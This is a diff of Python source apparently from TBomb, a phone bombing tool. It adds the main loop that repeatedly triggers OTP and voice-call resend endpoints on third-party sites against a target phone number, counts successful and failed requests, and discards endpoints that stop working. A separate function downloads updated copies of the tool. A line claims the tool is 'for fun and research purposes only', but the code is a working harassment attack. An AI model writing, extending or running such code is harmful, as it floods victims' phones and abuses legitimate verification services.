@@ -211,4 +211,79 @@ def getapi(pn, lim, cc):
         rd = os.popen('curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
         return rd.find("1") != -1
     return False
-    
+
+def remsp(num):
+    num = num.replace(' ', '')
+    num = num.replace('-', '')
+    return num
+
+def start(target, counter, delay, ch, cc):
+    clerscrn()
+    banntext()
+    failed = 0
+    requested = 0
+    success = int(requested) - int(failed)
+    bombs = int(counter) + 1
+    while success < (int(bombs)):
+        clerscrn()
+        banntext()
+        try:
+            api = random_choice(ch)
+        except Exception:
+            if cc == "91":
+                print("All API endpoints seem to have expired or patched up" + "\n" + \
+                      "You must update TBomb to continue using this tool")
+                input("Press [ENTER] to exit")
+                sys.exit()
+            else:
+                if success>0:
+                    print("Bombing limit for your country has been reached" + "\n" + \
+                          "TBomb is worked upon to increase the international limit")
+                    input("Press [ENTER] to exit")
+                    os.system("rm *.xxx* > /dev/null 2>&1")
+                    banntext()
+                    sys.exit()
+                else:
+                    print("Your country code is not supported as of now" + "\n" + \
+                          "You can request the support for your country code by mailing at 'ggspeedx29@gmail.com' about it")
+                    input("Press [ENTER] to exit")
+                    sys.exit()
+        print("Bombing is in progress - Please be patient" + \
+             "Please stay connected to the internet during bombing" + \
+             "Target number       : " + str(cc) + str(target) + \
+             "Sent requests       : " + str(requested) + \
+             "Successful requests : " + str(success) + \
+             "Failed requests     : " + str(failed) + \
+             "This tool was made for fun and research purposes only" + \
+             "TBomb was created by SpeedX")
+        try:
+            result = getapi(target, api, cc)
+        except Exception:
+            result = False
+        requested = requested + 1
+        if result:
+            success = success + 1
+        else:
+            failed = failed + 1
+            while ch.count(api) > 0:
+                ch.remove(api)
+            time.sleep(float(delay))
+            if requested % 3 == 0:
+                chekintr()
+    print(W)
+    print("Bombing completed!")
+    os.system("rm *.xxx* > /dev/null 2>&1")
+    banntext()
+    sys.exit()
+
+def update():
+    stuff_to_update = ["bomber.py", ".version", "bombmode.py"]
+    for fl in stuff_to_update:
+        dat = urllib.request.urlopen("https://raw.githubusercontent.com/TheSpeedX/TBomb/master/" + fl).read()
+        file = open(fl, "wb")
+        file.write(dat)
+        file.close()
+    print("TBomb was updated to the latest version" + "\n" + 
+          "Please run the script again to load the latest version")
+    sys.exit()
+
